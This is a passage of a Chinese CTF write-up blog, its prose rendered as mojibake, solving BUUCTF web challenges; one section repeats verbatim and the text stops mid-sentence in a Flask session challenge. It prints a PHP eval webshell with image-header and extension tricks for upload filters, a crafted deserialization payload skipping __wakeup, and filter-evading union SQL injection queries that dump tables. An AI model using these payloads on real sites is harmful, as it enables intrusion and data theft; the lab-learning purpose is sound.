        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜2019-upload"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜2019-upload">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 upload</h2><p><em>å…³é”®è¯ï¼šphpï¼Œphtmlï¼Œè¿‡æ»¤ &lt;?ï¼Œæ–‡ä»¶ä¸Šä¼ </em></p><p>æ ¹æ® Content-Type åˆ¤æ–­å›¾ç‰‡ï¼šContent-Type: image/png</p><p>è¿‡æ»¤â€™&lt;?â€™ï¼Œä¼  phtml ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>phtml ç®€å•æ¥è¯´å°±æ˜¯å°† php åµŒå…¥ html ä¸­</p><p>(è¿™é¢˜å¾ˆè¯¡å¼‚çš„æ˜¯æˆ‘ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼Œå›æ˜¾ Not Image)</p><hr><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-php"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜2019-php">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 php</h2><p><em>å…³é”®è¯ï¼šphp ååºåˆ—åŒ–ï¼Œç½‘ç«™å¤‡ä»½ï¼Œphp ä»£ç å®¡è®¡</em></p><p>ğŸ€ç½‘ç«™å¤‡ä»½æ–‡ä»¶åçŒœæµ‹ï¼Œå«Œéº»çƒ¦ç›´æ¥ä¸Šç›®å½•æ‰«æï¼Œä¸º www.zip</p><p>www.zip ä¸­åŒ…å«çš„æ–‡ä»¶ä¸»è¦ä¸º index.phpï¼Œclass.phpï¼Œflag.php</p><p>ğŸ€index.php ä¸­å…³é”®ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä» get è¯·æ±‚ä¸­è·å–â€™selectâ€™çš„å€¼ï¼Œå†å°†è¯¥å˜é‡ååºåˆ—åŒ–ï¼ˆå…¶ä¸­å˜é‡å‰åŠ  @æ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é”™ä¿¡æ¯è¾“å‡ºï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼‰</p><p>ğŸ€class.php ä¸­ Name å¯¹è±¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span><span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä»__destruct () å‡½æ•°ä¸­çš„é€»è¾‘æ¥çœ‹ï¼Œåªæœ‰å½“ password=100ï¼Œusername=admin æ—¶ï¼Œä¼šè¾“å‡º flag çš„å€¼</p><p>__construct æ„é€ å‡½æ•°ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„å€¼èµ‹å€¼ç»™å˜é‡ password å’Œ usernameï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–åä¼šè°ƒç”¨__wakeup ()ï¼Œå°† username èµ‹å€¼ä¸º guest</p><p><strong>CVE-2016-7124ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup çš„æ‰§è¡Œ</strong></p><p>ğŸ‘†ğŸ‘†ğŸ‘†é€šè¿‡ä¸Šè¿°æ¼æ´å¯ä»¥è·³è¿‡__wakeup () çš„æ‰§è¡Œ</p><p>æ„é€  exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>ï¼š&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”¨ url ç¼–ç è¾“å‡ºä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>åœ¨ Nameusernameï¼ŒNamepassword ä¸­ï¼Œç±»åä»¥åŠå˜é‡åå‰éƒ½å­˜åœ¨ä¸å¯è§å­—ç¬¦ %00</p><p>å› ä¸º private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š ascii ä¸º 0 çš„å­—ç¬¦ (ä¸å¯è§å­—ç¬¦)</p><p>â­payload éœ€è¦ä¿®æ”¹çš„åœ°æ–¹ä¸ºæˆå‘˜å˜é‡ä¸ªæ•°ï¼Œä»¥åŠç§æœ‰å­—æ®µå‰å¢åŠ  %00 (url ç¼–ç çš„ä¸å¯è§å­—ç¬¦)</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“</strong></p><p>ğŸŒ°<a href="https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/">å¤‡ä»½æ–‡ä»¶å‚è€ƒ</a></p><p>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€ï¼štarã€tar.gzã€zipã€rar</p><p>å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åï¼šwebã€websiteã€backupã€backã€wwwã€wwwrootã€temp</p><p>ğŸŒ°<a href="https://www.php.net/manual/zh/language.oop5.magic.php">php é­”æœ¯æ–¹æ³•</a></p><p>serialize () æ—¶ï¼Œè‹¥å­˜åœ¨__sleep ()ï¼Œä¼šå…ˆè°ƒç”¨__sleep ()ï¼Œå†æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</p><p>unserialize () æ—¶ï¼Œè‹¥å­˜åœ¨__wakeup ()ï¼Œååºåˆ—åŒ–åä¼šè°ƒç”¨__wakeup ()</p><hr><h2 id="actf2020-æ–°ç”Ÿèµ›-upload1"><a class="markdownIt-Anchor" href="#actf2020-æ–°ç”Ÿèµ›-upload1">#</a> ACTF2020 æ–°ç”Ÿèµ› Upload1</h2><p><em>å…³é”®è¯ï¼šå›¾ç‰‡é©¬</em></p><p>ğŸ´åˆæˆå›¾ç‰‡é©¬å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 2.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼  shell.jpgï¼ŒæŠ“åŒ…æ›´æ”¹åç¼€åä¸º phpï¼Œå›æ˜¾ nonono~ Bad fileï¼</p><p>æ›´æ”¹åç¼€åä¸ºéšæœºä¹±ç å­—ç¬¦ï¼Œå›æ˜¾ä¸Šä¼ æˆåŠŸï¼Œç›®æµ‹è®¾ç½®é»‘åå•</p><p><img src="buuctf-web1.png" alt=""></p><p>è®¾ç½® phtml åç¼€åï¼Œç»•è¿‡æˆåŠŸ</p><p>shell.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>åˆæˆå›¾ç‰‡é©¬ï¼Œä¸Šä¼ æ”¹åç¼€ï¼Œè¿ shell</p><hr><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-babysql1"><a class="markdownIt-Anchor" href="#æå®¢å¤§æŒ‘æˆ˜-2019-babysql1">#</a> æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL1</h2><p><em>å…³é”®è¯ï¼šsql æ³¨å…¥ã€è¿‡æ»¤å…³é”®å­—ã€è¿‡æ»¤ç‰¹æ®Šç¬¦å·ã€å­—ç¬¦æ‹¼æ¥</em></p><p>çœ‹é¢˜ï¼Œç™»å½•æ¡† sql æ³¨å…¥</p><p>ç»æµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤å­—ç¬¦ï¼šselectï¼Œsleepï¼Œ*ï¼Œandï¼Œorï¼Œunionâ€¦</p><p>å“ˆå“ˆå¾ˆå¤šå¸¸ç”¨çš„å˜›ï¼Œä¸æµ‹äº†</p><p><img src="buuctf-web2.png" alt=""></p><p>è€ƒè™‘ä½¿ç”¨å­—ç¬¦æ‹¼æ¥ç»•è¿‡å…³é”®è¯æ£€æµ‹ï¼Œ%2b ä¸ºâ€™+â€˜url ç¼–ç ï¼Œç›´æ¥ä½¿ç”¨â€™+' ä¼šè¢«è½¬æˆç©ºæ ¼ï¼Œpayloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; an%2bd+slee%2bp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ç€é¢˜ç›®ï¼Œå‘ç°è¿‡æ»¤çš„å…³é”®å­—éƒ½ç½®ç©ºçš„ï¼ŒåŒå†™ä¹Ÿèƒ½ç»•è¿‡</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; anandd sleesleepp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure><p>æ‰“ç‚¹åˆ°æ­¤ç»“æŸâ­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­â­</p><p>ç›´æ¥ç™»å½•è·å¾—çš„å¹¶ä¸æ˜¯ flagï¼Œç»§ç»­æ‰¾ ï¼Œorder by å‘ç°ä¸º 3 ä¸ªå­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; o%2brder b%2by 4--+&amp;password=111</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾çš„å­—æ®µä¸º 2ï¼Œ3</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨ï¼Œä» information_schema.tables ä¸­æŸ¥æ‰¾å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨åï¼Œæ‹¼æ¥åœ¨ä¸€èµ·ååœ¨ç¬¬äºŒä¸ªå­—æ®µè¾“å‡º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&#x27;</span>b4bsql<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello id,username,passwordï¼</span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°ä¸¤ä¸ªè¡¨å­—æ®µéƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£æ‰¾ b4bsql ä¸­çš„æ•°æ®å§</p><p>æ‹¼æ¥æ¯è¡Œæ•°æ®ï¼Œå¹¶ç”¨ â€” éš”å¼€</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&#x27;</span><span class="comment">---&#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><img src="buuctf-web3.png" alt=""></p><p><strong>æ€»ç»“</strong></p><p><a href="https://www.cnblogs.com/apolloren/p/11002449.html">SQL å­—ç¬¦ä¸²æ‹¼æ¥</a></p><hr><h2 id="actf2020-æ–°ç”Ÿèµ›-backupfile1"><a class="markdownIt-Anchor" href="#actf2020-æ–°ç”Ÿèµ›-backupfile1">#</a> ACTF2020 æ–°ç”Ÿèµ› BackupFile1</h2><p><em>å…³é”®è¯ï¼šis_numeric () ç»•è¿‡ï¼Œ== ç»•è¿‡ï¼Œphp å¼±ç±»å‹æ¯”è¾ƒè¡¨</em></p><p>çœ‹é¢˜ï¼Œæ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œindex.php.bak</p><p>ğŸ´index.php ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);    &#125;    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æ 1ï¸âƒ£ä¸‹ï¼Œget ä¼ é€’å‚æ•° key</p><p>key é€šè¿‡ is_numeric åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå†é€šè¿‡ intval è·å–å˜é‡ key çš„æ•´æ•°å€¼</p><p>æœ€åå¦‚æœå˜é‡ key==â€œ123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3â€ï¼Œè¾“å‡º flag</p><p>ãƒ¾ (ï½¡ï½€Ğ”Â´ï½¡) å¹²å˜›å¹²å˜›å‘¢è¿™æ˜¯ï¼Œæ°”äºº</p><p>áƒš(â•¹â—¡â•¹áƒš) å¥½äº†ï¼Œç™¾åº¦å®Œå›æ¥äº†</p><p>is_numeric ()ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ 16 è¿›åˆ¶ï¼Œç»•è¿‡åˆ¤æ–­ï¼ˆç»å¸¸é€ æˆ sql æ³¨å…¥ï¼‰</p><p>intval ()ï¼Œè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œé»˜è®¤ä¸ºåè¿›åˆ¶</p><p>==ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œå½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œåªæå–å­—ç¬¦ä¸²ä¸­å¼€å¤´çš„æ•´æ•°éƒ¨åˆ†</p><p>â­ç„¶åçªç„¶å‘ç° str æ˜¯ä»¥ 123 å¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒæ˜¯ç­‰äº 123 çš„</p><p>å¥½äº† payloadï¼š?key=123ï¼ŒæˆåŠŸæ‹¿åˆ° flag</p><p>â€¦(ï¼¿ ï¼¿) ãƒï½œå£</p><hr><h2 id="actf2020-æ–°ç”Ÿèµ›-backupfile1-2"><a class="markdownIt-Anchor" href="#actf2020-æ–°ç”Ÿèµ›-backupfile1-2">#</a> ACTF2020 æ–°ç”Ÿèµ› BackupFile1</h2><p><em>å…³é”®è¯ï¼šis_numeric () ç»•è¿‡ï¼Œ== ç»•è¿‡ï¼Œphp å¼±ç±»å‹æ¯”è¾ƒè¡¨</em></p><p>çœ‹é¢˜ï¼Œæ‰¾å¤‡ä»½æ–‡ä»¶ï¼Œindex.php.bak</p><p>ğŸ´index.php ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);    &#125;    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æ 1ï¸âƒ£ä¸‹ï¼Œget ä¼ é€’å‚æ•° key</p><p>key é€šè¿‡ is_numeric åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ï¼Œå†é€šè¿‡ intval è·å–å˜é‡ key çš„æ•´æ•°å€¼</p><p>æœ€åå¦‚æœå˜é‡ key==â€œ123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3â€ï¼Œè¾“å‡º flag</p><p>ãƒ¾ (ï½¡ï½€Ğ”Â´ï½¡) å¹²å˜›å¹²å˜›å‘¢è¿™æ˜¯ï¼Œæ°”äºº</p><p>áƒš(â•¹â—¡â•¹áƒš) å¥½äº†ï¼Œç™¾åº¦å®Œå›æ¥äº†</p><p>is_numeric ()ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ 16 è¿›åˆ¶ï¼Œç»•è¿‡åˆ¤æ–­ï¼ˆç»å¸¸é€ æˆ sql æ³¨å…¥ï¼‰</p><p>intval ()ï¼Œè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œé»˜è®¤ä¸ºåè¿›åˆ¶</p><p>==ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œå½“å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œåªæå–å­—ç¬¦ä¸²ä¸­å¼€å¤´çš„æ•´æ•°éƒ¨åˆ†</p><p>â­ç„¶åçªç„¶å‘ç° str æ˜¯ä»¥ 123 å¼€å¤´ï¼Œå¼±ç±»å‹æ¯”è¾ƒæ˜¯ç­‰äº 123 çš„</p><p>å¥½äº† payloadï¼š?key=123ï¼ŒæˆåŠŸæ‹¿åˆ° flag</p><p>â€¦(ï¼¿ ï¼¿) ãƒï½œå£</p><hr><h2 id="hctf-2018-admin1"><a class="markdownIt-Anchor" href="#hctf-2018-admin1">#</a> HCTF 2018 admin1</h2><p><em>å…³é”®å­—ï¼šflaskï¼Œsession ä¼ªé€ ï¼Œunicode æ¬ºéª—</em></p><p>ğŸ¦‹ç™»å½•å’Œæ³¨å†Œç•Œé¢ï¼Œçœ‹é¢˜ admin</p><p>è¾“å…¥ admin/admin ç™»å½•å¤±è´¥</p><p>æ³¨å†Œ admin/admin è¯¥è´¦æˆ·å·²è¢«æ³¨å†Œ</p><p>ğŸ¦‹çˆ†ç ´â‘§è¡Œï¼Œè¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œæˆ‘è§‰å¾—ç•™ä¸€ä¸ªæ³¨å†Œé¡µé¢åº”è¯¥æ˜¯ç”¨æ¥æ³¨å†Œçš„</p><p>æ³¨å†Œ admin123/admin123ï¼ˆå¼±å£ä»¤è€ç©å®¶Ù©â—”Ì¯â—”Û¶ ï¼‰</p><p>ç™»å½•åå›æ˜¾ï¼ˆæµ‹äº†ä¸€éå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼‰ï¼š</p><p><img src="buuctf-web5.png" style="zoom:40%;" /><img src="buuctf-web6.png" style="zoom:40%;" /></p><img src="buuctf-web4.png" style="zoom:22%;" /><p>ğŸ¦‹åœ¨ changepassword ä¸­æœ‰ä¸€è¡Œè¢«æ³¨é‡Šæ‰çš„æç¤ºä¿¡æ¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure><p>flask æ˜¯ä¸€ä¸ªå¾®å‹çš„ python å¼€å‘çš„ web æ¡†æ¶</p><p>ç„¶åå‘ç°æ˜¯é¢˜ç›®æºç ï¼Œä½†æ˜¯.sql æ–‡ä»¶ä¸­å­˜å‚¨çš„ admin å¯†ç æ˜¯ hash åŠ å¯†è¿‡çš„</p><p>ğŸ€å¯¹ä¸èµ·æˆ‘åªèƒ½æƒ³åˆ°æ„é€  admin çš„ 